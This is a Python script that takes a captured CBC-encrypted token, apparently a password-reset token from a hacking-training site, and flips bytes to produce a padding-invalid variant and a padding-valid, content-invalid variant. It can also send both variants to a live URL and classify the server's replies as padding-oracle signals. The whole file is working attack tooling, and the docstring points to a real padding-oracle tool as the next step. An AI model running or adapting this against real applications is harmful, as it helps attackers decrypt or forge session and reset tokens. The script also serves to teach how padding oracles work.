#!/usr/bin/env python3
"""
padding_oracle_classify.py

Given one real, captured CBC-encrypted token (hex), derive two new tokens
without knowing the key:

  1. A "padding-invalid" token: breaks PKCS7 padding on decrypt.
  2. A "padding-valid, content-invalid" token: still decrypts and passes
     padding validation, but the recovered plaintext is garbage, so the
     app rejects it on content grounds instead (e.g. "user not found").

This is the same two-outcome distinction documented for Sarthi HR exercise 8
and confirmed live for houserenting.web2.hackable.training's password-reset
token -- useful for teaching/demoing the oracle, or for feeding the right
error-signal string into a real tool like `padding-oracle-attacker`
(`poattack`).

Why this works (CBC mechanics):
  P_i = D(C_i) XOR C_(i-1)      [C_(-1) is the IV]
Flipping one byte of C_k changes exactly:
  - P_k completely (full AES avalanche through D())
  - P_(k+1) by exactly one bit, at the same byte offset (via the XOR term)
  - nothing in P_(k+2) or beyond -- the corruption never propagates further.

So:
  - Flipping the LAST byte of the whole ciphertext always lands in the final
    block's last plaintext byte, which is *always* a PKCS7 padding byte
    (PKCS7 pads every message, even block-aligned ones, with a full block).
    Changing it almost always breaks padding validation.
  - Flipping a byte in block 0 only reaches block 1 (one block of
    propagation) -- it can never reach the FINAL block unless block 0 and
    the final block are the same or adjacent. So if the token has >= 3
    blocks total, flipping block 0 is *guaranteed* to leave the final
    block's padding completely untouched, while still garbling enough of
    the plaintext (the user id / email) that content validation fails.

Usage:
  python3 padding_oracle_classify.py <hex_token>
  python3 padding_oracle_classify.py <hex_token> --verify-url \
      "https://houserenting.web2.hackable.training/forgetPass/changePassword?token="
"""
import argparse
import sys
import urllib.request
import urllib.error


def flip_byte(raw: bytes, index: int, xor: int = 0x01) -> bytes:
    b = bytearray(raw)
    b[index] ^= xor
    return bytes(b)


def classify_tokens(token_hex: str, block_size: int = 16):
    raw = bytes.fromhex(token_hex)
    if len(raw) % block_size != 0:
        raise ValueError(
            f"token is {len(raw)} bytes, not a multiple of block size {block_size} "
            f"-- wrong block size, or this isn't a raw block-cipher token"
        )
    num_blocks = len(raw) // block_size
    if num_blocks < 2:
        raise ValueError("need at least 2 blocks total to derive both variants")

    # 1. Padding-invalid: corrupt the very last byte of ciphertext.
    padding_invalid = flip_byte(raw, len(raw) - 1)

    # 2. Content-invalid, padding-valid: corrupt a byte guaranteed to never
    #    propagate into the final block.
    if num_blocks >= 3:
        content_invalid = flip_byte(raw, 0)  # first byte of block 0
        guaranteed = True
    else:
        # Only 2 blocks: block 0 IS the block right before the final one, so
        # any flip there also perturbs the final block by one bit. Best
        # effort only -- whether padding survives depends on how much real
        # padding there is, which we can't know without querying the server.
        content_invalid = flip_byte(raw, 0)
        guaranteed = False

    return padding_invalid.hex(), content_invalid.hex(), guaranteed, num_blocks


def verify(url_prefix: str, token_hex: str, label: str):
    url = url_prefix + token_hex
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=15) as resp:
            body = resp.read().decode(errors="replace")
            status = resp.status
            final_url = resp.geturl()
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="replace")
        status = e.code
        final_url = e.url
    except Exception as e:
        print(f"  [{label}] request failed: {e}")
        return

    lowered = body.lower()
    if "went wrong" in lowered:
        verdict = "PADDING INVALID (generic error page)"
    elif "user_not_found" in final_url or ("error" in final_url and "forgetpass" in final_url.lower()):
        verdict = "PADDING VALID, CONTENT INVALID (redirect)"
    elif status == 200 and "new password" in lowered:
        verdict = "DECRYPTED TO A REAL USER (unexpected!)"
    else:
        verdict = "UNRECOGNIZED response shape -- inspect manually"
    print(f"  [{label}] HTTP {status} -> {final_url}")
    print(f"           => {verdict}")


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    ap.add_argument("token", help="captured hex-encoded ciphertext token")
    ap.add_argument("--block-size", type=int, default=16, help="cipher block size in bytes (default 16)")
    ap.add_argument(
        "--verify-url",
        help="URL prefix ending in 'token=' -- if given, sends both derived "
        "tokens to the live server and classifies the real response",
    )
    args = ap.parse_args()

    try:
        padding_invalid, content_invalid, guaranteed, num_blocks = classify_tokens(
            args.token, args.block_size
        )
    except ValueError as e:
        print(f"error: {e}", file=sys.stderr)
        sys.exit(1)

    print(f"Input token: {num_blocks} blocks of {args.block_size} bytes")
    print()
    print("Padding-INVALID token (should trigger the padding-error page):")
    print(f"  {padding_invalid}")
    print()
    tag = "guaranteed" if guaranteed else "best-effort, not guaranteed -- only 2 blocks total"
    print(f"Padding-VALID / content-INVALID token ({tag}):")
    print(f"  {content_invalid}")

    if args.verify_url:
        print()
        print("Verifying live against the server...")
        verify(args.verify_url, padding_invalid, "padding-invalid")
        verify(args.verify_url, content_invalid, "content-invalid")


if __name__ == "__main__":
    main()
